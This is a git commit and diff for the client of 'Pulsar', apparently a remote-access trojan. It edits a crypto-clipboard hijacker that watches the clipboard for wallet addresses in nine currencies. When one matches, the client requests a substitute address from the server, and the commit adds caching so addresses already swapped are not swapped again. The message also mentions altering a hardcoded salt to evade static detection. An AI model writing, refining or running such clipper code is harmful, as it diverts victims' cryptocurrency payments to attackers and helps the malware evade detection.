697ce464f300418db2c46d925182dabddb22dede
backdoorskid <m9dwi8d8og2o@proton.me>
2025-04-16 02:17:55 +0100

    fix issue #125 and optimize clipper (#126)
    * change batch sleep method
    
    pinging localhost may cause the sleep to not occur if the client has whatever default port ping sets to listening on localhost
    
    * modify hardcoded salt
    
    ideally would not want to hardcode a value like this that could easily be statically detected.
    
    the new salt is generated via the result of a SHA256 hash which can be verified so its source is known (even though im not the nsa so pretty much any random value would suffice)
    
    this will also break every single existing client until they are updated so lol
    
    * Update BSOD.cs
    
    just fixed the codes formatting here
    
    * lol
    
    * fix clipper bug and optimize clipper
    
    * change
    
    * fix

--- Pulsar.Client/User/ClipboardChecker.cs
+++ Pulsar.Client/User/ClipboardChecker.cs
@@ -14,7 +14,7 @@ namespace Pulsar.Client.User
     {
         private readonly PulsarClient _client;
         private readonly List<Tuple<string, Regex>> _regexPatterns;
-
+        
         private const int WM_CLIPBOARDUPDATE = 0x031D;
 
         [DllImport("user32.dll", SetLastError = true)]
@@ -30,15 +30,15 @@ namespace Pulsar.Client.User
             {
                 // the regex is made by chatgpt so like idk if they ALWAYS work, but they should
 
-                new Tuple<string, Regex>("BTC", new Regex(@"^(1|3|bc1)[a-zA-Z0-9]{25,39}$")),  // BTC regex
-                new Tuple<string, Regex>("LTC", new Regex(@"^(L|M|3)[a-zA-Z0-9]{26,33}$")),    // LTC regex
-                new Tuple<string, Regex>("ETH", new Regex(@"^0x[a-fA-F0-9]{40}$")),             // ETH regex
-                new Tuple<string, Regex>("XMR", new Regex(@"^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$")),  // XMR regex
-new Tuple<string, Regex>("SOL", new Regex(@"^[1-9A-HJ-NP-Za-km-z]{32,44}$")),       // SOL regex
-new Tuple<string, Regex>("DASH", new Regex(@"^X[1-9A-HJ-NP-Za-km-z]{33}$")),       // DASH regex
-new Tuple<string, Regex>("XRP", new Regex(@"^r[0-9a-zA-Z]{24,34}$")),              // XRP regex
-new Tuple<string, Regex>("TRX", new Regex(@"^T[1-9A-HJ-NP-Za-km-z]{33}$")),        // TRX regex
-new Tuple<string, Regex>("BCH", new Regex(@"^(bitcoincash:)?(q|p)[a-z0-9]{41}$"))  // BCH regex
+                new Tuple<string, Regex>("BTC", new Regex(@"^(1|3|bc1)[a-zA-Z0-9]{25,39}$")),      // BTC regex
+                new Tuple<string, Regex>("LTC", new Regex(@"^(L|M|3)[a-zA-Z0-9]{26,33}$")),        // LTC regex
+                new Tuple<string, Regex>("ETH", new Regex(@"^0x[a-fA-F0-9]{40}$")),                // ETH regex
+                new Tuple<string, Regex>("XMR", new Regex(@"^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$")), // XMR regex
+                new Tuple<string, Regex>("SOL", new Regex(@"^[1-9A-HJ-NP-Za-km-z]{32,44}$")),      // SOL regex
+                new Tuple<string, Regex>("DASH", new Regex(@"^X[1-9A-HJ-NP-Za-km-z]{33}$")),       // DASH regex
+                new Tuple<string, Regex>("XRP", new Regex(@"^r[0-9a-zA-Z]{24,34}$")),              // XRP regex
+                new Tuple<string, Regex>("TRX", new Regex(@"^T[1-9A-HJ-NP-Za-km-z]{33}$")),        // TRX regex
+                new Tuple<string, Regex>("BCH", new Regex(@"^(bitcoincash:)?(q|p)[a-z0-9]{41}$"))  // BCH regex
 
             };
             this.CreateHandle(new CreateParams());
@@ -63,12 +63,16 @@ new Tuple<string, Regex>("BCH", new Regex(@"^(bitcoincash:)?(q|p)[a-z0-9]{41}$")
                 {
                     string clipboardText = Clipboard.GetText();
 
-                    foreach (var pattern in _regexPatterns)
-                    {
-                        if (pattern.Item2.IsMatch(clipboardText))
+                    // If the copied address is already the clipped address, updating the clipboard with the same address will be
+                    // a waste of resources for both the server and client; it may also cause undefined behavior.
+                    if (!Pulsar.Client.Messages.ClipboardHandler._cachedAddresses.Contains(clipboardText)) {
+                        foreach (var pattern in _regexPatterns)
                         {
-                            _client.Send(new DoGetAddress { Type = pattern.Item1 });
-                            break;
+                            if (pattern.Item2.IsMatch(clipboardText))
+                            {
+                                _client.Send(new DoGetAddress { Type = pattern.Item1 });
+                                break;
+                            }
                         }
                     }
                 }
